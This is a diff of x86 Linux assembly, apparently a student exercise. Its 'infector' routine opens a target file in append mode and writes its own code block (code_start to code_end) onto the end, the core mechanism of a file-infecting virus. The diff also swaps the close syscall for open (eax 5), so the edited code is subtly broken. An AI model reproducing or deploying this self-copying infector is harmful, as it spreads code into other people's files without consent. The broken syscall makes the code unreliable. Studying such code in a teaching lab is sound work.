@@ -50,8 +50,7 @@ system_call:
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
 
-
-
+code_start:
 infection:
     push    ebp             ; prepare stack frame for main
     mov     ebp, esp
@@ -73,22 +72,22 @@ infection:
     popad
     jmp end
 
-code_start:
 
 infector:
     push    ebp             ; prepare stack frame for main
     mov     ebp, esp
-
     sub esp, 4
-    pushad                     ;open the file
+    pushad 
+
+    ;open the file
     mov eax, 5 
     mov ebx, dword[ebp+8]
-    mov ecx, 1024               ;open for appending to the end of file
-    mov edx,0777                ;read,write and execute by all
+    mov ecx, 1089               ;open for appending to the end of file
     int 0x80
 
     mov [ebp-4], eax  ;get fb returned value
 
+    ;write
     mov eax, 4 
     mov ebx, [ebp-4]
     mov ecx, code_start ; pointer to output buffer
@@ -96,13 +95,11 @@ infector:
     sub edx, code_start
     int 0x80
 
-    mov eax, 6 ;close the file
+    ;close the file
+    mov eax, 5 
     mov ebx, [ebp - 4]
     int 0x80
     popad
-
-    ;sub esp, 4
-;code_end:
 
 end:
     add esp, 4
@@ -110,5 +107,5 @@ end:
     mov esp, ebp
     pop ebp
     ret
-
+    
 code_end:
